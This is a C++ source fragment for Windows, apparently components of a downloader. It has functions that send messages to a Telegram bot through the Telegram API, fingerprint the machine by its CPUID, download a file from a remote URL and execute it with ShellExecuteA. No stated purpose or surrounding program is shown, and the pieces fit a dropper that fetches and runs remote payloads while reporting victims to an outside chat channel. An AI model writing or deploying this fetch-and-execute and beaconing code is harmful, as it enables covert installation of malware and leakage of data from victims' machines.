#include <iostream>
#include <fstream>
#include <cstdlib>
#include <shellapi.h>


void sendMessageToTelegram(const char* message)
{
	HINTERNET hInternet = InternetOpenA("TelegramBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet) {
		HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT,
			NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (hConnect) {				

			char jsonPayload[512];
			snprintf(jsonPayload, sizeof(jsonPayload),
				"chat_id=%s&text=%s&parse_mode=Markdown",
				TELEGRAM_CHAT_ID, message);

			HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/bot" TELEGRAM_BOT_TOKEN "/sendMessage",
				NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

			if (hRequest) {
				const char* headers = "Content-Type: application/x-www-form-urlencoded\r\n";
				BOOL sent = HttpSendRequestA(hRequest, headers, strlen(headers), jsonPayload, strlen(jsonPayload));
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
}

void GetCPUID(char* buffer, int bufSize)
{
	int CPUInfo[4] = { 0 };
	__cpuid(CPUInfo, 0);
	snprintf(buffer, bufSize,
		"%08X-%08X-%08X-%08X",
		CPUInfo[0], CPUInfo[1], CPUInfo[2], CPUInfo[3]);
}

bool downloadRemoteFile(const std::string& url, const std::string& filepath) {
	HINTERNET hInternet = InternetOpenA("CppDownload", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (hInternet) {
		HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
		if (hUrl) {
			std::ofstream outfile(filepath, std::ios::binary);
			if (outfile.is_open()) {
				char buffer[2048];
				DWORD bytesRead;
				while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
					outfile.write(buffer, bytesRead);
				}
				outfile.close();
				InternetCloseHandle(hUrl);
				InternetCloseHandle(hInternet);
				return true;
			}
			else {
				std::cerr << "Failed to open file for writing." << std::endl;
			}
		}
		else {
			std::cerr << "Failed to open URL: " << GetLastError() << std::endl;
		}
		InternetCloseHandle(hInternet);
	}
	else {
		std::cerr << "Failed to initialize WinINet." << std::endl;
	}
	return false;
}

bool runDownloadedFile(const std::string& filepath) {
	HINSTANCE result = ShellExecuteA(NULL, "open", filepath.c_str(), NULL, NULL, SW_SHOWDEFAULT);
	if ((int)result > 32) {
		return true;
	}
	else {
		std::cerr << "Failed to run downloaded file. Error code: " << (int)result << std::endl;
		return false;
	}
}